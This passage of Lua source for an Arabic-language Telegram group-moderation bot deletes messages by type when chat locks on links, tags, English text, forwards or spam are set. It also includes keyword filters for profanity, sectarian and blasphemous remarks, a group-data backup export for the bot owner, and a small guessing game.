local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Audio]")
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Audio]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Audio]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Audio]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Audio]")
end
end
end
end
--Voice
--Voice
------- --- Voice---------DevProx
-- -----------------Voice
--Voice
--Voice
elseif msg_type == 'MSG:Voice' then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Voice]")
end
end
end
if DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Voice]")
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Voice]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Voice]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Voice]")
end
end
end
end
--Location
--Location
------- --- Location---------DevProx
-- -----------------Location
--Location
--Location
elseif msg_type == 'MSG:Location' then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
if DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Location]")
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Location]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Location]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Location]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
end
--Video
--Video
------- --- Video---------DevProx
-- -----------------Video
--Video
--Video
elseif msg_type == 'MSG:Video' then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Video]")
end
end
end
if DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Video]")
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Video]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Video]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Video] ")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Video]")
end
end
end
end
--Gif
--Gif
------- --- Gif---------DevProx
-- -----------------Gif
--Gif
--Gif
elseif msg_type == 'MSG:Gif' then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Gif]")
end
end
end
if DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Gif] ")
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Gif]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Gif]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Gif]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Gif]")
end
end
end
end
--Text
--Text
------- --- Text---------DevProx
-- -----------------Text
--Text
--Text
elseif msg_type == 'MSG:Text' then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
end
--vardump(msg)
if DevAbs:get(DevProx.."bot:group:link"..msg.chat_id_) == 'waiting' then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local abs = "bot:group:link"..msg.chat_id_
DevAbs:set(DevProx..abs,glink)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 تـۖم حفـۨظ ٱڵـرابط ٱرسـل  (الرابط)  ڵـعـړض ٱڵـرآبـط ٱڵجديد', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 تـۖم صـنـع رآبـط جـډيـډ\nٱرسـڵ (الرابط) لٲضهار ٱڵـرآبـط ٱڵـجـډيـډ ', 1, 'md')
end
end
end
function check_username(extra,result,success)
--vardump(result)
local username = (result.username_ or '')
local svuser = 'user:'..result.id_
if username then
DevAbs:hset(svuser, 'username', username)
end
if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
if DevAbs:get(DevProx..'bot:bots:gkgk'..msg.chat_id_) and not is_momod(msg.chat_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
else
chat_kick(msg.chat_id_, bots[i].user_id_)
return false
end
end
end
getUser(msg.sender_user_id_,check_username)
DevAbs:set(DevProx..'bot:editid'.. msg.id_,msg.content_.text_)
if not is_free(msg, msg.content_.text_) then
if not is_VipGroup(msg.sender_user_id_, msg.chat_id_) then
check_filter_words(msg,text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Text]")
if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Text]")
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Text]")
end
end
end
if msg.content_.text_:match("@") then
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Text]")
end
end
if msg.content_.text_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Text]")
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Text]")
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
local abs = 'bot:sens:spam'..msg.chat_id_
if not DevAbs:get(DevProx..abs) then
sens = 400
else
sens = tonumber(DevAbs:get(DevProx..abs))
end
if DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
delete_msg(chat,msgs)
print("Deleted [Lock] [Spam] ")
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Text]")
end
end
end
end
----------------DevProx----------
local msg = data.message_
text = msg.content_.text_
if text and is_monsh(msg.sender_user_id_, msg.chat_id_) then 
if DevAbs:get('DevProx:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('DevProx:'..bot_id..'id:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⛔️❗️ تـۖم ٱڵـغـاء ٱلٱمـر', 1, 'md')
DevAbs:del('DevProx:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('DevProx:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('DevProx:'..bot_id..'id:user'..msg.chat_id_)  
DevAbs:incrby('DevProx:'..bot_id..'nummsg'..msg.chat_id_..iduserr,numadded)  
Dev_Abs(msg.chat_id_, msg.id_,  1, "❗️☻ تـۖم ٱضـافة  *{ "..numadded..' }* رساله ', 1, 'md')
end
end
if text:match("طيز") or text:match("ديس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(DevProx.."fshar"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
end
end
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("سني") or text:match("طائفتكم") or text:match("اني سني") or text:match("اني شيعي") or text:match("انا سني") or text:match("انا شيعي") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(DevProx.."taf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⛔️❗️ ممنوع ٱڵـتكلم بٱڵـطائفية هـنـا  ', 1, 'md')   
end 
end
if text:match("خره بالله") or text:match("خبربك") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(DevProx.."kaf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⛔️❗️ ممنوع ٱڵـكـفـر هـنـا  ', 1, 'md')   
end 
end
---------------------------------------------DevProx----------------------------------------------------------
if text == 'جلب نسخه الكروبات' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then
local list = DevAbs:smembers(DevProx..'bot:groups')  
local t = '{"BOT_ID": '..DevProx..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = title_name(v) or ''
NAME = NAME:gsub('"','')
NAME = NAME:gsub('#','')
NAME = NAME:gsub([[\]],'')
link = DevAbs:get(DevProx.."bot:group:link"..v) or ''
welcome = DevAbs:get(DevProx..'welcome:'..v) or ''
MNSH = DevAbs:smembers(DevProx..'bot:monsh:'..v)
MDER = DevAbs:smembers(DevProx..'bot:owners:'..v)
MOD = DevAbs:smembers(DevProx..'bot:momod:'..v)
VIP = DevAbs:smembers(DevProx..'bot:VipGroup:'..v)
if k == 1 then
t = t..'"'..v..'":{"GP_NAME":"'..NAME..'",'
else
t = t..',"'..v..'":{"GP_NAME":"'..NAME..'",'
end

if #VIP ~= 0 then 
t = t..'"VIP":['
for k,v in pairs(VIP) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}'
end
t = t..'}}'
local File = io.open('./'..bot_id..'.JSON', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..DevProx..'.JSON', '❗️☻ عـدد كـروبات ٱڵـبوت  '..#list..'',dl_cb, nil)
end
if text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
---------------------------******** END MSG CHECKS DevProx********--------------------------------------------
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Abs( msg.chat_id_, msg.id_, 1,"*📤┇ يوجد فقط { 6 } اختيارات ارسل اختيارك مره اخره*\n", 1, "md")    
return false  end 
local GETNUM = DevAbs:get(DevProx.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(DevProx.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'\n*📤┇ مبروك لقد ربحت  \n💍 ┇ المحيبس باليد رقم { '..NUM..' } \n🏆 ┇حصلت على {  5 } نقاط يمكن استبدالها برسائل  *', 1, "md") 
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbs:del(DevProx.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'\n*📤┇ للاسف لقد خسرت  \n💍 ┇ المحيبس باليد رقم { '..GETNUM..' } \n🏆 ┇ حاول مره اخرى للعثور على المحيبس  *', 1, "md")
end
end
end
if DevAbs:get(DevProx.."bot:support:link" .. msg.sender_user_id_) then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local abs = "bot:supports:link"
DevAbs:set(DevProx..abs, glink)
if DevAbs:get(DevProx.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇  *Support link has been Saved*  ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حفض رابط كروب الدعم ", 1, "md")
end
DevAbs:del(DevProx.."bot:support:link" .. msg.sender_user_id_)
elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
local bID = msg.content_.text_:match("@(.*)")
local abs = "bot:supports:link"
DevAbs:set(DevProx..abs, bID)
if DevAbs:get(DevProx.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ *Support Bot ID* has been *Saved* ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حفض معرف الدعم ", 1, "md")
end
DevAbs:del(DevProx.."bot:support:link" .. msg.sender_user_id_)
end
end
if DevAbs:get(DevProx..'DevProx4'..msg.sender_user_id_) then
DevAbs:del(DevProx..'DevProx4'..msg.sender_user_id_)
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatAdministrators?chat_id='..msg.content_.text_..'')
local data = JSON:decode(url)
if res == 400 then
if data.description == "Bad Request: supergroup members are unavailable" then 
Dev_Abs(msg.chat_id_,msg.id_, 1, "*🏆┇ لم ترفعني ادمن في قناتك ارفعني اولا *\n", 1 , "md")
return false 
elseif data.description == "Bad Request: chat not found" then 
Dev_Abs(msg.chat_id_,msg.id_, 1, "*🏆┇ هذا المعرف ليس تابع لقناة *\n", 1 , "md")
return false
end end 
if not msg.content_.text_ then
Dev_Abs(msg.chat_id_,msg.id_, 1, "*🏆┇ هذا المعرف ليس تابع لقناة *\n", 1 , "md")
return false
end
local CH_BOT = msg.content_.text_:match("(.*)")
DevAbs:set(DevProx..'DevProx3',CH_BOT)
Dev_Abs(msg.chat_id_,msg.id_, 1, "🏆┇ تم حفظ القناة \n☑️┇ قم بتفعيل الاشتراك الاجباري الان \n", 1 , "html")
return false
end
if DevAbs:get(DevProx.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
local zakrf = text:match("(.*)")  
DevAbs:del(DevProx.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_)     
if not text:find('[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]') then 
DevProx = zakrf 
local font_base = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  
local font_abs = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  
